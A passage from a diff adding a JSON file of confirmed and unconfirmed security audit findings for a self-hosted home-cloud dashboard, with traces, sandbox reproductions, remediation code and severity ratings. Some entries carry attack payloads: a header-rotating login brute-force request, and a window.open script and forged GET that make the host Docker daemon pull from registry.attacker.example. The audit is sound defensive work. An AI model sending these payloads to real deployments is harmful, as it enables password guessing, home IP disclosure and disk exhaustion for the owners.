@@ -1,0 +1,1156 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "home-cloud/auth/loopback-cf-connecting-ip-trust",
+    "title": "Login rate limiter can be bypassed by any loopback client that rotates CF-Connecting-IP",
+    "description": "POST /api/auth/login keys its 5-failures-per-minute lockout on getClientIp(). When the TCP peer is 127.0.0.1 or ::1, getClientIp() returns the client-supplied CF-Connecting-IP header as-is. The code assumes the only loopback client is the local cloudflared. Any other process that can open a loopback connection to :3000 (another local OS user, a container with network_mode: host, or another host service) can send a new CF-Connecting-IP value on each attempt. Every attempt then gets its own empty bucket, so the lockout never triggers and online password guessing is unlimited.",
+    "root_cause": "Trust in the forwarded client-IP header is tied to the TCP peer being loopback, not to an authenticated proxy identity. The limiter has no bucket keyed on the real peer that header rotation cannot reset.",
+    "intended_behavior": "README.md:115 and SECURITY.md:67 say the lockout applies to every interface and that clients cannot rotate headers to reset the window. A caller must not be able to reset or avoid the failed-login budget by choosing a header value.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/routes/auth.js",
+        "line": 155,
+        "scope": "router.post('/login')",
+        "description": "Unauthenticated login endpoint mounted at /api/auth (agent/index.js:67), reachable over loopback at 127.0.0.1:3000."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/auth.js",
+        "line": 63,
+        "scope": "getClientIp",
+        "description": "If the socket peer is loopback, the code reads req.headers['cf-connecting-ip'] (line 64) and returns the trimmed client-supplied value (line 66) with no other check."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/auth.js",
+        "line": 157,
+        "scope": "router.post('/login')",
+        "description": "checkLoginRateLimit(clientIp) looks up a bucket keyed on the attacker-chosen string. A new string has no record, so the attempt is allowed."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/routes/auth.js",
+        "line": 182,
+        "scope": "router.post('/login')",
+        "description": "recordFailedLogin(clientIp) records the failure under the spoofed key. The lockout at lines 136-138 only fires when one key reaches 5 failures, and rotation keeps every key at 1."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agent/routes/auth.js",
+        "line": 64,
+        "description": "CF-Connecting-IP is read from the request headers and trusted for any loopback peer."
+      },
+      {
+        "file": "agent/index.js",
+        "line": 222,
+        "description": "server.listen(PORT) with no host argument binds all interfaces, including loopback, which every local process can reach."
+      },
+      {
+        "file": "agent/middleware/origin.js",
+        "line": 45,
+        "description": "The only extra check on login is that Origin matches Host. A non-browser client sets Origin to http://127.0.0.1:3000 and passes."
+      },
+      {
+        "file": "README.md",
+        "line": 115,
+        "description": "Documents that CF-Connecting-IP is honored only from loopback 'the local cloudflared' and that clients cannot rotate headers to reset the window. This assumption fails for other loopback clients."
+      },
+      {
+        "file": "agents/gv2/artifacts/result_1.txt",
+        "line": 3,
+        "description": "Sandbox run against the real agent app: 100 wrong passwords with a rotating CF-Connecting-IP all returned 401 and none returned 429. Controls on lines 1-2 (no header, fixed header) lock at the 5th attempt. Line 4: the correct dummy password was then accepted (200)."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "No authentication is needed for the login endpoint itself."
+      },
+      {
+        "kind": "network_routing",
+        "description": "The attacker must reach the agent from 127.0.0.1 or ::1: another local OS user, a host-network container, or another compromised local service. LAN and tunnel clients cannot spoof this. A LAN peer address is used directly, and the Cloudflare edge sets CF-Connecting-IP itself."
+      },
+      {
+        "kind": "data_state",
+        "description": "Success depends on how guessable the password is. The minimum is 8 characters, and the auto-generated default is 32 hex characters, which makes brute force infeasible."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A local unprivileged process on the host, or a network_mode: host container, that can connect to 127.0.0.1:3000.",
+      "payloads": [
+        "POST /api/auth/login HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nOrigin: http://127.0.0.1:3000\r\nContent-Type: application/json\r\nCF-Connecting-IP: 198.51.100.<n>\r\n\r\n{\"password\":\"<guess n>\"}"
+      ],
+      "instructions": [
+        "Start the agent app with dummy PASSWORD/JWT_SECRET on 127.0.0.1 inside the sandbox (agents/gv2/scratch/verify_c1.js).",
+        "Control: send 6 wrong passwords with no CF-Connecting-IP header, then 6 with a fixed header value. Both lock at attempt 5 (429).",
+        "Send 100 wrong passwords, using a different CF-Connecting-IP value for each request.",
+        "Send the correct dummy password with yet another header value."
+      ],
+      "observed_result": "All 100 rotated attempts returned 401 and none was locked out. The correct password was then accepted with 200 and a session cookie. The same loopback peer without the header stayed locked (429), which shows the bypass comes only from the header key."
+    },
+    "remediation": {
+      "strategy": "Do not let the peer being loopback grant trust in a client header. Pick one of these, in order: (1) also count every failure against the real socket peer, with a higher aggregate threshold that header rotation cannot reset; (2) honor CF-Connecting-IP only on a dedicated listener (separate port or unix socket) used only by cloudflared, or only when a secret header injected by the tunnel config is present. Option 1 is the smallest change and keeps per-client lockout for tunnel users.",
+      "code_changes": [
+        {
+          "file_name": "agent/routes/auth.js",
+          "fixed_code": "// Aggregate budget for the real TCP peer so header rotation cannot yield unlimited guesses.\nconst PEER_MAX_ATTEMPTS = 30;\nfunction peerKey(req) {\n    return 'peer:' + (normalizePeerAddress(req.socket?.remoteAddress || '') || 'unknown');\n}\n\nrouter.post('/login', (req, res) => {\n    const clientIp = getClientIp(req);\n    const peer = peerKey(req);\n    for (const key of [clientIp, peer]) {\n        const rateCheck = checkLoginRateLimit(key);\n        if (!rateCheck.allowed) {\n            res.set('Retry-After', String(rateCheck.retryAfterSeconds));\n            return res.status(429).json({ error: 'Too many failed login attempts.', retryAfter: rateCheck.retryAfterSeconds });\n        }\n    }\n    // ... on failure: recordFailedLogin(clientIp); recordFailedLogin(peer, PEER_MAX_ATTEMPTS);\n    // ... on success: recordSuccessfulLogin(clientIp) only (do not clear the peer budget).\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Needs an existing foothold that can reach host loopback, such as another local user or a host-network container. Remote internet and LAN clients cannot exploit it."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "It defeats the brute-force limiter, but takeover still requires guessing the password, which is at least 8 characters and is a 32-hex random value by default. If a guess succeeds, the attacker gets the root-equivalent dashboard."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Reproduced against the unmodified agent Express app in the sandbox, with matching controls. The source path is short and unambiguous."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "home-cloud/csrf/side-effecting-get-image-pull",
+    "title": "Cross-site GET to /api/docker/images/pull makes the host Docker daemon pull an attacker-chosen image",
+    "description": "originGuard only checks Origin/Referer for POST, PUT, PATCH, and DELETE. GET /api/docker/images/pull?image=<ref> is cookie-authenticated and calls docker.pull(ref) on the host daemon. The session cookie is SameSite=Lax, so browsers send it on top-level cross-site GET navigations. Any website the logged-in owner visits can navigate a tab or popup to https://dash.<domain>/api/docker/images/pull?image=registry.attacker.example/x:latest. The host's dockerd then contacts the attacker's registry, which discloses the home egress IP that the tunnel otherwise hides, and downloads arbitrarily large layers onto host disk. I reviewed every other GET route in agent/routes/*.js (settings, network, metrics, file, docker, compose, auth/me) plus /api/ping and /api/health. They are read-only or streaming reads. The only other effects are transient process spawns for search and logs. So this is the only side-effecting GET.",
+    "root_cause": "A state-changing operation (image pull) is exposed as a GET, and the CSRF control (originGuard) exempts GET by design. That leaves only SameSite=Lax, which allows top-level GET navigations.",
+    "intended_behavior": "Operations that change host state, such as pulling images or contacting registries, should only be reachable through methods covered by the Origin check, or through a GET that rejects cross-site requests.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/routes/docker.js",
+        "line": 301,
+        "scope": "router.get('/images/pull')",
+        "description": "Cookie-authenticated GET route mounted at /api/docker (agent/index.js:108), reachable by a top-level cross-site navigation."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/middleware/origin.js",
+        "line": 44,
+        "scope": "stateChangingOriginAllowed",
+        "description": "Returns true for any method outside STATE_CHANGING (line 7: POST/PUT/PATCH/DELETE), so GET skips the Origin/Referer check."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/middleware/auth.js",
+        "line": 5,
+        "scope": "check",
+        "description": "Authentication accepts the ambient cookie token. It is SameSite=Lax (agent/routes/auth.js:14), so it is sent on top-level cross-site GET."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/routes/docker.js",
+        "line": 315,
+        "scope": "router.get('/images/pull')",
+        "description": "docker.pull(imageName) with the attacker-controlled req.query.image (line 302) issues POST /images/create?fromImage=<ref> to the host Docker daemon."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agents/gv1/artifacts/result_1.txt",
+        "line": 3,
+        "description": "Verifier sandbox reproduction with fake Docker Engine on unix socket: GET carrying SameSite=Lax cookie and cross-site Referer returns 200 text/event-stream and triggers POST /images/create on engine (lines 2-3). Controls: no cookie returns 401 (line 4); cross-site POST prune returns 403 (line 5)."
+      },
+      {
+        "file": "agent/middleware/origin.js",
+        "line": 7,
+        "description": "STATE_CHANGING contains only POST, PUT, PATCH, and DELETE."
+      },
+      {
+        "file": "agent/routes/auth.js",
+        "line": 14,
+        "description": "The session cookie uses sameSite: 'lax', which browsers send on top-level cross-site GET navigations."
+      },
+      {
+        "file": "agent/routes/docker.js",
+        "line": 302,
+        "description": "The image reference comes straight from the query string with no allowlist or registry restriction."
+      },
+      {
+        "file": "dashboard/src/components/apps/DockerApp.tsx",
+        "line": 2151,
+        "description": "The dashboard calls this route through EventSource (GET), which explains the method choice."
+      },
+      {
+        "file": "agents/v1/artifacts/result_1.txt",
+        "line": 8,
+        "description": "Sandbox run with a fake Docker Engine on a unix socket: a GET carrying the cookie, a cross-site Referer, and Sec-Fetch-Site: cross-site returned 200 text/event-stream (line 7). The engine received POST /images/create?fromImage=registry.attacker.example%2Fprobe&tag=latest. Controls: no cookie gives 401 (line 9), and a POST with a cross-site Referer gives 403 (line 10)."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "The owner has a valid session cookie (7-day JWT) and visits an attacker-controlled page that triggers a top-level navigation or window.open."
+      },
+      {
+        "kind": "environmental_dependency",
+        "description": "The browser applies standard SameSite=Lax behavior, which sends cookies on top-level cross-site GET. A cross-site iframe or fetch would not carry the cookie."
+      },
+      {
+        "kind": "data_state",
+        "description": "The attacker knows the dashboard hostname (dash.<domain> or the LAN address)."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "The host Docker daemon has registry egress, and no registry mirror or proxy hides the host IP."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A cross-site web attacker who gets the logged-in owner's browser to load a page.",
+      "payloads": [
+        "<script>window.open('https://dash.example.com/api/docker/images/pull?image=registry.attacker.example/probe:latest')</script>",
+        "GET /api/docker/images/pull?image=registry.attacker.example%2Fprobe%3Alatest HTTP/1.1\r\nCookie: token=<owner session>\r\nReferer: https://evil.example/\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\n\r\n"
+      ],
+      "instructions": [
+        "Start the real agent app in the sandbox with dummy secrets and DOCKER_HOST pointing at a fake Docker Engine unix socket that logs requests (agents/v1/scratch/v1_harness.cjs).",
+        "Log in with the dummy password to obtain the SameSite=Lax cookie.",
+        "Send the navigation-shaped GET with the cookie, a cross-site Referer, and no Origin header.",
+        "Controls: repeat without the cookie, and send a cross-site POST to /api/docker/images/prune."
+      ],
+      "observed_result": "The GET returned 200 text/event-stream, and the fake Docker Engine received POST /images/create?fromImage=registry.attacker.example%2Fprobe&tag=latest. The request without a cookie got 401. The cross-site POST got 403 and caused no engine call. A real browser was not run; the cookie behavior is the standard SameSite=Lax top-level-GET exception."
+    },
+    "remediation": {
+      "strategy": "Move image pull to POST so originGuard covers it, and stream progress from a fetch() POST response in the dashboard instead of EventSource. As defense in depth, have originGuard reject cookie-authenticated API requests with Sec-Fetch-Site: cross-site whatever the method. This still allows same-origin EventSource reads.",
+      "code_changes": [
+        {
+          "file_name": "agent/routes/docker.js",
+          "fixed_code": "router.post(\"/images/pull\", async (req, res) => {\n\tconst imageName = req.body && typeof req.body.image === \"string\" ? req.body.image.trim() : \"\";\n\tif (!imageName) {\n\t\treturn res.status(400).json({ error: \"Missing image\" });\n\t}\n\t// ... unchanged SSE-style streaming body (writeHead text/event-stream, docker.pull, followProgress)\n});"
+        },
+        {
+          "file_name": "dashboard/src/components/apps/DockerApp.tsx",
+          "fixed_code": "const resp = await fetch(\"/api/docker/images/pull\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({ image: imageName }),\n});\nconst reader = resp.body!.getReader();\n// parse \"data: ...\\n\\n\" chunks exactly as the EventSource onmessage handler did"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Standard CSRF. It needs one visit from a logged-in owner (long 7-day sessions) and a known dashboard hostname. No other bug or browser quirk is required."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Fully bypasses the CSRF control for one host action. The host daemon contacts an attacker registry, which reveals the home egress IP, and downloads attacker-sized layers that can fill disk. It does not run code or create containers, so the blast radius is limited."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The source path is short. The real agent app and the real dockerode client produced the Engine API call in the sandbox, and the controls behaved as expected. Only the browser cookie step relies on documented SameSite=Lax behavior rather than an observed browser."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "home-cloud/dashboard/lan-redirect-unauthenticated-ping",
+    "title": "Dashboard redirects from HTTPS to http://<stored LAN IP> after any 200 from an unauthenticated ping, with no check of server identity",
+    "description": "When the dashboard is loaded from a non-local hostname (for example https://dash.<domain>, including the pre-auth /login page), useNetworkDetector reads the LAN IP and port. These come from the authenticated /api/network/info call or, before login, from localStorage. It then fetches http://<ip>:<port>/api/ping (falling back to /api/health) and, if either returns any 2xx response, sets window.location.href to http://<ip>:<port><path><search>. Nothing checks that the responder is the Home Cloud agent: no nonce, no signed token, no response-body check. Suppose the owner has previously stored a private LAN IP and later opens the HTTPS dashboard on another network where an attacker holds that same private address (for example 192.168.1.50 on public Wi-Fi) and answers 200 with Access-Control-Allow-Origin: *. The owner is then sent from the TLS origin to an attacker-served plaintext page at the same path, such as /login, which enables a credential-phishing page under a familiar URL shape. Even on the real LAN, the switch moves the session cookie and password entry from HTTPS to plaintext HTTP. In a bounded sandbox (Node fetch, no browser), the unmodified detection logic was reproduced: an impostor that returns 200 'not-home-cloud' caused href to be set to http://<impostor>/login. Whether a real browser allows the HTTPS page to make this http://<private-ip> fetch decides whether the issue is reachable, and that could not be observed.",
+    "claimed_root_cause": "runDetectionOnce (dashboard/src/hooks/useNetworkDetector.ts:130-165) treats any ok response from http://<localIp>:<localPort>/api/ping or /api/health as proof that the client is on the owner's LAN and talking to the owner's agent, then navigates the top-level window to that plaintext origin. The responder's identity is never bound to the HTTPS-authenticated server (for example a server-issued nonce or HMAC echoed by the LAN agent), and there is no user confirmation before downgrading from HTTPS to HTTP.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "dashboard/src/pages/login.tsx",
+        "line": 12,
+        "scope": "Login",
+        "description": "The pre-auth login page mounts useNetworkDetector on any hostname, including https://dash.<domain>."
+      },
+      {
+        "kind": "propagation",
+        "file": "dashboard/src/hooks/useNetworkDetector.ts",
+        "line": 64,
+        "scope": "runDetectionOnce",
+        "description": "When /api/network/info fails (pre-auth), localIp/localPort are taken from localStorage keys home-cloud:server_local_ip/port that an earlier authenticated session persisted (lines 76-79)."
+      },
+      {
+        "kind": "propagation",
+        "file": "dashboard/src/hooks/useNetworkDetector.ts",
+        "line": 139,
+        "scope": "runDetectionOnce",
+        "description": "Cross-origin fetch to http://<localIp>:<localPort>/api/ping with mode cors and targetAddressSpace 'private'; the fallback to /api/health at line 147 has no targetAddressSpace."
+      },
+      {
+        "kind": "sink",
+        "file": "dashboard/src/hooks/useNetworkDetector.ts",
+        "line": 164,
+        "scope": "runDetectionOnce",
+        "description": "On any pingRes.ok (line 155), the top-level window navigates to http://<localIp>:<localPort><pathname><search> with no identity check on the responder."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "dashboard/src/hooks/useNetworkDetector.ts",
+        "line": 155,
+        "description": "The only acceptance condition is pingRes.ok; the response body and headers are never inspected."
+      },
+      {
+        "file": "agent/index.js",
+        "line": 70,
+        "description": "The real /api/ping is unauthenticated, has ACAO *, and returns only {status:'ok'}, so it offers no identity proof the client could check."
+      },
+      {
+        "file": "docs/learn/split_horizon_dns_and_local_lan_switching.md",
+        "line": 266,
+        "description": "The project's own doc says browsers' mixed-content rules may block an HTTPS page from fetching http://192.168.x; the detector then falls back to tunnel mode (line 269). This browser behaviour is the decisive unobserved fact."
+      },
+      {
+        "file": "docs/SYSTEM_DESIGN.md",
+        "line": 573,
+        "description": "Documents the intended behaviour: when the ping succeeds, the browser is redirected to the LAN origin before sign-in."
+      },
+      {
+        "file": "agents/gv3/artifacts/result_1.txt",
+        "line": 4,
+        "description": "Independent sandbox reproduction: an impostor returning 200 caused window.location.href to be set to http://127.0.0.1:<impostor>/login (Node fetch, no browser policy enforced)."
+      }
+    ],
+    "blockers": [
+      "Whether current Chromium, Firefox and Safari let an https://dash.<domain> page complete a cors fetch to http://<private-ip>:<port>/api/ping. Plain mixed content blocks it; Chromium's Local Network Access exemption needs a supported targetAddressSpace value (the code passes 'private', not 'local') plus a user permission grant that persists per origin. No browser is available in the sandbox, and the source cannot settle this. If every browser blocks the fetch, the redirect never fires and there is no impact.",
+      "Whether the owner's browser already holds a persisted Local Network Access grant for dash.<domain>. That grant is what would let the fetch succeed silently on a hostile network sharing the same private IP."
+    ],
+    "validation_plan": {
+      "local": "In a disposable browser profile on an isolated test network (no real deployment): serve the built dashboard over HTTPS at a test hostname with a locally trusted test CA. Seed localStorage home-cloud:server_local_ip=<test-host private IP> and server_local_port=3000. Run an impostor on that IP:3000 that returns 200 with Access-Control-Allow-Origin: * (and Access-Control-Allow-Private-Network: true) and a page body 'IMPOSTOR'. Open https://<test-host>/login in current Chrome, Firefox and Safari. Record whether the ping fetch is blocked (DevTools console mixed-content/LNA message) or succeeds, whether a Local Network Access prompt appears, and whether the tab ends at http://<ip>:3000/login showing IMPOSTOR. Repeat in Chrome after granting the LNA prompt once, with the impostor swapped in afterwards.",
+      "deployment": "Owner check, no audit traffic: on the owner's normal browser, open https://dash.<domain>/login from the home LAN and see whether it auto-switches to http://<lan-ip>:3000 and whether a local-network permission prompt was ever granted for dash.<domain> (Chrome: Site settings > Local network access)."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "home-cloud/dashboard/missing-frame-ancestors-sibling-clickjacking",
+    "title": "Dashboard sends no X-Frame-Options or CSP frame-ancestors, so same-site sibling app subdomains can frame an authenticated dash.<domain> for clickjacking",
+    "description": "The agent serves the SPA (static files and the /{*path} fallback) and all API responses with no X-Frame-Options or Content-Security-Policy frame-ancestors header. No helmet or equivalent is present in agent/. Ingress autowiring publishes the owner's containers at <sub>.<domain>, which are same-site with dash.<domain>. The session cookie is SameSite=Lax and host-only, and Lax cookies are sent on same-site iframe loads. So a page on any sibling subdomain, viewed as a top-level document, can frame https://dash.<domain>/settings (or /docker, /terminal) as the authenticated owner. Deep links open the matching window at fixed coordinates. Requests made by the framed dashboard come from its own origin, so originGuard accepts them. Single-click controls, such as the Full System Root Access switch that issues PUT /api/settings/storage, could then be clickjacked. Purely cross-site framers (an attacker's own domain) get no cookie because of SameSite=Lax, so the attack requires a lower-trust party that can serve HTML on a sibling subdomain.",
+    "claimed_root_cause": "agent/index.js sets no anti-framing response header (X-Frame-Options: DENY or CSP frame-ancestors 'none'/'self') on dashboard HTML. Framing protection for the root-equivalent control panel therefore depends only on SameSite=Lax, which does not separate dash.<domain> from same-site sibling app subdomains created by ingress autowiring.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "dashboard/src/pages/desktop.tsx",
+        "line": 28,
+        "scope": "Desktop",
+        "description": "Top-level dashboard page mounts inside an iframe on a same-site sibling subdomain."
+      },
+      {
+        "kind": "propagation",
+        "file": "dashboard/src/pages/desktop.tsx",
+        "line": 56,
+        "scope": "getInitialDeepLink",
+        "description": "The deep-link path opens the matching window (terminal/metrics/files/docker/settings) at fixed coordinates (settings at x=140,y=40, lines 129-137), so click targets are predictable inside a frame."
+      },
+      {
+        "kind": "sink",
+        "file": "dashboard/src/components/apps/SettingsApp.tsx",
+        "line": 849,
+        "scope": "Storage scope switch",
+        "description": "A single click calls handleToggleSystemRoot, which sends PUT /api/settings/storage {allowSystemRoot:true} (lines 230-238) from the dashboard origin with the ambient cookie."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agent/routes/auth.js",
+        "line": 14,
+        "description": "The cookie is sameSite 'lax' and host-only (no domain attribute). Lax cookies are sent on same-site subresource/iframe requests from sibling <sub>.<domain> pages."
+      },
+      {
+        "file": "agent/index.js",
+        "line": 64,
+        "description": "originGuard only compares Origin with Host. Requests from inside the framed dashboard carry the dashboard's own Origin and pass."
+      },
+      {
+        "file": "agents/gv3/artifacts/result_2.txt",
+        "line": 1,
+        "description": "Verifier local run: GET /, /settings, /docker, /terminal, /login return 200 HTML with x-frame-options and content-security-policy both absent; PUT /api/settings/storage succeeds with cookie and matching dashboard origin."
+      }
+    ],
+    "blockers": [
+      "Whether any lower-trust party can serve attacker-controlled HTML/script as a top-level page on a sibling <sub>.<domain>, for example a compromised or untrusted container app, or an app that hosts user-uploaded HTML. This depends on which apps the owner exposes, which is deployment state outside source.",
+      "Whether the Cloudflare zone adds X-Frame-Options/CSP frame-ancestors at the edge (Transform Rules / response header modification). That is not source-visible.",
+      "Actual browser rendering and SameSite cookie attachment for a same-site iframe of dash.<domain> (including Firefox/Safari partitioning behaviour) could not be observed: no browser is available in the sandbox."
+    ],
+    "validation_plan": {
+      "local": "On an isolated test machine, run the agent with dummy PASSWORD/JWT secret behind a local HTTPS reverse proxy for dash.test.example and app.test.example (locally trusted test CA, hosts-file entries). Log in at dash.test.example in a disposable browser profile. Open https://app.test.example/frame.html containing <iframe src='https://dash.test.example/settings' style='opacity:0.5'>. Confirm the authenticated Settings window renders inside the frame, then click the storage switch and check GET /api/settings/storage for allowSystemRoot=true. Reset it afterwards.",
+      "deployment": "Owner check, no audit traffic: run `curl -sI https://dash.<domain>/settings` and check for x-frame-options or content-security-policy frame-ancestors added by Cloudflare. List which exposed <sub>.<domain> apps serve content that someone other than the owner can author or upload."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "home-cloud/ingress/stale-rule-after-container-delete",
+    "title": "Public tunnel ingress rule can outlive the deleted container and route to whatever later binds its host port",
+    "description": "Expose creates a cloudflared ingress rule <sub>.<domain> -> http://localhost:<hostPort>. Deleting a single container only removes rules for ports read from info.NetworkSettings.Ports of a container that must already be stopped (remove() without force fails with 409 for running containers), and deleting a compose project never touches ingress at all. A leftover rule keeps publishing <sub>.<domain> to the internet, and the dashboard only shows rules matched to a current container's PublicPort, so the owner has no visible indication or removal path. Any later service on that host port (another owner service assumed private, or a port bound by a lower-trust local process or container) becomes publicly reachable under the owner's domain without the owner choosing to expose it.",
+    "claimed_root_cause": "Ingress cleanup is keyed on the runtime port map of a stopped container (agent/routes/docker.js:92-105) instead of on the recorded rule/container identity, and the compose DELETE route (agent/routes/compose.js:380-408) performs no ingress cleanup; rules are stored only as hostname -> localhost:port with no ownership link (agent/services/ingress.js:312-334).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/routes/docker.js",
+        "line": 88,
+        "scope": "DELETE /api/docker/containers/:id/delete",
+        "description": "Owner deletes a (necessarily stopped) container."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/docker.js",
+        "line": 95,
+        "scope": "DELETE /containers/:id/delete",
+        "description": "Cleanup iterates info.NetworkSettings.Ports from inspect; for exited containers this runtime map is expected to be empty, so no host port is found."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/compose.js",
+        "line": 391,
+        "scope": "DELETE /api/docker/compose/:name",
+        "description": "compose down -v and folder removal with no call to removeIngressByPort/unexposeContainer (source-certain stale rule for exposed compose services)."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/services/ingress.js",
+        "line": 324,
+        "scope": "_removeIngressByPortInternal",
+        "description": "The only port-based cleanup, never reached when the port list is empty; the rule http://localhost:<port> stays in the tunnel config."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agent/routes/docker.js",
+        "line": 93,
+        "description": "container.remove() without force; a running container yields 409 'Stop the container before deleting it' (:113-116), so cleanup always inspects a stopped container."
+      },
+      {
+        "file": "agent/routes/docker.js",
+        "line": 449,
+        "description": "Expose itself derives hostPort from the same runtime NetworkSettings.Ports map, showing the rule is bound only to a port number."
+      },
+      {
+        "file": "agent/routes/docker.js",
+        "line": 28,
+        "description": "Container list only surfaces a rule when a current container's PublicPort matches it, hiding orphaned rules."
+      },
+      {
+        "file": "agent/routes/docker.js",
+        "line": 478,
+        "description": "Unexpose requires the owner to know the subdomain; no route lists orphaned ingress rules."
+      },
+      {
+        "file": "agents/gv3/artifacts/result_3.txt",
+        "line": 2,
+        "description": "Verifier local simulation: exited container with null/empty Ports map and compose DELETE both leave ingress rules intact in cloudflared config."
+      }
+    ],
+    "blockers": [
+      "Whether the Docker Engine version in use returns an empty NetworkSettings.Ports map for an exited container (decisive for the single-container delete path); no Docker daemon is available in the sandbox.",
+      "Whether, in the owner's deployment, any service or lower-trust process later binds a host port that still has an orphaned public rule (decisive for real exposure impact)."
+    ],
+    "validation_plan": {
+      "local": "On a disposable Docker host with a dummy CF_DOMAIN and a scratch CF_CONFIG: run `docker run -d --name v3probe -p 18080:80 nginx`, call POST /api/docker/containers/v3probe/expose {\"subdomain\":\"v3probe\"} with cloudflared reload stubbed, `docker stop v3probe`, record `docker inspect v3probe --format '{{json .NetworkSettings.Ports}}'`, call DELETE /api/docker/containers/v3probe/delete, then check whether the scratch config still contains service http://localhost:18080. Repeat with a minimal compose project exposed the same way and DELETE /api/docker/compose/<name>.",
+      "deployment": "Owner inspects ~/.cloudflared config.yml (without sharing credentials) and lists ingress hostnames whose http://localhost:<port> has no corresponding running container in `docker ps --format '{{.Ports}}'`; report count and ports only."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "home-cloud/session/websocket-survives-epoch-revocation",
+    "title": "Open host-terminal WebSocket survives logout, logout-all and password change",
+    "description": "Session revocation is implemented by bumping a global sessionEpoch that is compared against the JWT only on HTTP requests and at WebSocket upgrade time. No code closes already-open /terminal or /ws/docker/exec sockets (or their PTY/exec streams) when the epoch changes. A holder of a stolen or leftover session cookie who has a host terminal WebSocket open keeps a live root-equivalent host shell after the owner uses 'log out everywhere' or changes the password, even though every new HTTP request and new WebSocket with the same cookie is rejected. README.md:116 and SECURITY.md:92-93 state that the epoch bump rejects old JWTs on HTTP and WebSocket.",
+    "root_cause": "The authorization decision for a WebSocket is made once in handleSystemTerminal (agent/sockets/terminal.js:352-353) and handleContainerExec (agent/sockets/containerExec.js:15-16); the per-message handlers (terminal.js:380-398, containerExec.js:72-83) never re-check the epoch, and incrementSessionEpoch (agent/services/preferences.js:185-190) has no hook that terminates sockets authenticated under the previous epoch.",
+    "intended_behavior": "Bumping sessionEpoch via /api/auth/logout, /api/auth/logout-all or /api/settings/password should immediately invalidate every credential issued under the previous epoch, including terminating open WebSockets and their host PTY / container exec sessions.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "agent/index.js",
+        "line": 46,
+        "scope": "wss connection router",
+        "description": "WebSocket upgrade on /terminal is dispatched to handleSystemTerminal after the Origin check."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/sockets/terminal.js",
+        "line": 353,
+        "scope": "handleSystemTerminal",
+        "description": "JWT epoch compared to preferences.getSessionEpoch() only once, at connection time."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/auth.js",
+        "line": 205,
+        "scope": "POST /api/auth/logout-all",
+        "description": "Revocation only increments sessionEpoch and clears the caller's cookie; open sockets are untouched (same at :195 for /logout)."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/routes/settings.js",
+        "line": 343,
+        "scope": "POST /api/settings/password",
+        "description": "Password change revokes sessions only by incrementing sessionEpoch."
+      },
+      {
+        "kind": "propagation",
+        "file": "agent/services/preferences.js",
+        "line": 185,
+        "scope": "incrementSessionEpoch",
+        "description": "Persists the new epoch; no notification to socket handlers."
+      },
+      {
+        "kind": "sink",
+        "file": "agent/sockets/terminal.js",
+        "line": 398,
+        "scope": "handleSystemTerminal ws.on('message')",
+        "description": "Every later message on the already-authorized socket is written to the host PTY without re-checking the epoch."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "agents/gv1/artifacts/result_2.txt",
+        "line": 8,
+        "description": "Verifier sandbox reproduction: after POST /api/auth/logout-all (epoch 2) and POST /api/settings/password (epoch 3), old cookie gets 401 on HTTP endpoints and new WS is closed, but original WS stays OPEN and executes post-revocation marker command (lines 8, 16)."
+      },
+      {
+        "file": "agent/sockets/terminal.js",
+        "line": 352,
+        "description": "jwt.verify + epoch check performed only inside the connection handler."
+      },
+      {
+        "file": "agent/sockets/containerExec.js",
+        "line": 16,
+        "description": "Same connect-time-only epoch check for container exec; stdin forwarding at :83 never re-checks (source-only, no docker daemon in sandbox)."
+      },
+      {
+        "file": "agent/sockets/terminal.js",
+        "line": 415,
+        "description": "closeAllSessions exists but is only invoked from graceful shutdown (agent/index.js:185-188), not from revocation."
+      },
+      {
+        "file": "agent/middleware/auth.js",
+        "line": 12,
+        "description": "HTTP middleware re-checks the epoch per request, which is why HTTP is revoked while open sockets are not."
+      },
+      {
+        "file": "README.md",
+        "line": 116,
